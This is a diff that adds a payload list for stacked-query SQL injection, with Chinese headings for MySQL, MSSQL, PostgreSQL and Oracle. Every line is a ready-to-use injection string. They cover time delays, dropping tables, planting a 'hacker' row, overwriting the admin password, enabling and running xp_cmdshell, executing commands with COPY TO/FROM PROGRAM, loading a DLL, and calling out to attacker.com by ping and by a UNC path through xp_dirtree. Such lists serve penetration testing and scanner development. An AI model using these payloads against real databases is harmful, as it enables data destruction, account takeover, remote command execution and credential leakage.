@@ -1,0 +1,24 @@
+# 堆叠查询 - MySQL
+'; SELECT SLEEP(3)--
+'; SELECT SLEEP(3)#
+'; DROP TABLE test--
+'; INSERT INTO users VALUES('hacker','hacked')--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+
+# 堆叠查询 - MSSQL
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
+'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
+'; EXEC master..xp_cmdshell 'ping attacker.com'--
+'; DECLARE @q VARCHAR(8000); SET @q='\\attacker.com\share\file'; EXEC master..xp_dirtree @q--
+'; EXEC sp_addextendedproc 'xp_webserver','c:\temp\x.dll'--
+
+# 堆叠查询 - PostgreSQL
+'; SELECT pg_sleep(3)--
+'; COPY (SELECT '') TO PROGRAM 'id'--
+'; CREATE TABLE cmd_exec(cmd_output text)--
+'; COPY cmd_exec FROM PROGRAM 'id'--
+'; DROP TABLE IF EXISTS cmd_exec--
+
+# 堆叠查询 - Oracle
+'; EXECUTE IMMEDIATE 'SELECT 1 FROM dual'--
